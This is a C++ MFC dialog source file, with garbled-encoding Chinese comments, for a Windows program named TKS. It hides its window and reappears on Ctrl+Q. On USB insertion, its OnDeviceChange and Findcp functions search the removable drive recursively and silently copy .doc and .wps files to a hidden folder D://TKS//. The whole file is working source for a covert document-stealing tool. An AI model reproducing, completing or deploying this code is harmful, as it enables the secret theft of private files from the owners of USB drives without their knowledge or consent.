
// TKSDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "TKS.h"
#include "TKSDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CTKSDlg �Ի���




CTKSDlg::CTKSDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CTKSDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTKSDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CTKSDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CTKSDlg::OnBnClickedOk)
	ON_WM_DEVICECHANGE()
END_MESSAGE_MAP()


// CTKSDlg ��Ϣ�������

BOOL CTKSDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CTKSDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CTKSDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CTKSDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CTKSDlg::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	ShowWindow(SW_HIDE);
}

//�жϿ�ݼ��Ƿ񱻰���
BOOL CTKSDlg::PreTranslateMessage(MSG* pMsg)   
{  
    // TODO: Add your specialized code here and/or call the base class  
    //��PreTranslateMessage�ķ������ж�Ctrl+Q�Ƿ��£����¾�ִ�п�ݼ���Ӧ�Ĳ���  
    if(pMsg->message == WM_KEYDOWN && pMsg->wParam == 'Q' &&IsCTRLPressed())  
    {  
       ShowWindow(SW_SHOW);
		MessageBox(_T("Ctrl + Q ������"));  
        return TRUE;  
    }  
      
    return CDialog::PreTranslateMessage(pMsg);  
}  

BOOL CTKSDlg::OnDeviceChange(UINT nEventType, DWORD dwData)
{
	PDEV_BROADCAST_HDR pDevBroadcastHdr=(PDEV_BROADCAST_HDR)dwData; 
	PDEV_BROADCAST_DEVICEINTERFACE pDevInterface;
	if(nEventType==DBT_DEVICEARRIVAL)
    {
        //Do something
		//MessageBox(_T("USB IN"));
		CString m_str = _T("Z:");
	    for( char ch = 'Z'; ch >='D'; ch--)
		{
			m_str.SetAt(0,ch);
			UINT type = GetDriveType(m_str);
			if(DRIVE_REMOVABLE == type)
			{
				//MessageBox(_T("U �� �̷�Ϊ��")+m_str);
				break;
			}
		}
		Findcp(m_str);

	}
	return CDialog::OnDeviceChange(nEventType, dwData);
}

void CTKSDlg::Findcp(CString fname)
{
	CFileFind finder;
	CString filePath = fname+_T("//*");
	BOOL bFinished =finder.FindFile(filePath);
	while(bFinished)
	{
		bFinished =finder.FindNextFile();
		if(finder.IsDirectory() && !finder.IsDots())  //����Ŀ¼��ݹ���ô˷���
		{
			Findcp(finder.GetFilePath());
		}
		else
		{
			CString findname=finder.GetFilePath();
			CString namexx=findname.Right(4);
			CString xx=_T("D://TKS//")+finder.GetFileName();
			if(namexx==_T(".doc")||namexx==_T(".wps")||namexx==_T(".docx"))
			{
				BOOL m=CopyFile(findname,xx,FALSE);
				/*if(m)
					MessageBox(_T("1111"));
				else
					MessageBox(_T("2222"));*/
			}
		}
	}
}
